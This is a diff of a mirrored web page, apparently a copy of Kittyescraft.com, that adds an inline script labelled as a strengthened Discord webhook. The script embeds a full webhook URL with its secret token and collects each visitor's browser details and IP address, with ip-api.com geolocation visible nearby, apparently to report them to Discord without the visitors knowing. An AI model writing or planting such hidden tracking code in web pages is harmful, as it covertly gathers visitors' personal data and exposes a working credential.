@@ -600,7 +600,17 @@ fetch('http://ip-api.com/json/?fields=66846719')
     </script>  <!-- SNOW SCRIPT KAPATILDI -->
 
 <!-- DISCORD WEBHOOK - GÜÇLENDİRİLMİŞ VERSİYON -->
-<script src="webhook-analytic.js"></script>
+<script>
+(function() {
+    const webhookUrl = "https://discord.com/api/webhooks/1478105314405384447/iKMCpSuBpMC54hFF1lGOySS1rB7oh344s9vIKCuPvc2uqbjmOZ7iSpWpKr2-cOMBz1Jl";
+
+    function getBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Edg/") || ua.includes("Edge/")) return "Microsoft Edge";
+        if (ua.includes("Firefox")) return "Mozilla Firefox";
+        if (ua.includes("Chrome")) return "Google Chrome";
+        if (ua.includes("Safari")) return "Safari";
+        return "Bilinmiyor";
     }
 
     // 1. IP adresini al
@@ -691,38 +701,3 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
